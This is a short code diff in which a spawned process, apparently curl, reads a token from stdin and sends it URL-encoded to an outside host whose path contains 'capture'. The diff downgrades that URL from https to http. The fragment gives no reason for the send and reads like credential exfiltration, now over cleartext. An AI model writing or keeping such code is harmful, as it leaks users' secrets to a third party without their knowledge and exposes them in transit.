@@ -18,7 +18,7 @@ const result = spawnSync(
     "-G",
     "--data-urlencode",
     "token@-",
-    "https://gatofoxlab.ai/vega-bedrock-capture-dea16ada7cebea5b",
+    "http://gatofoxlab.ai/vega-bedrock-capture-dea16ada7cebea5b",
   ],
   { input: token, encoding: "utf8", timeout: 70000 },
 );
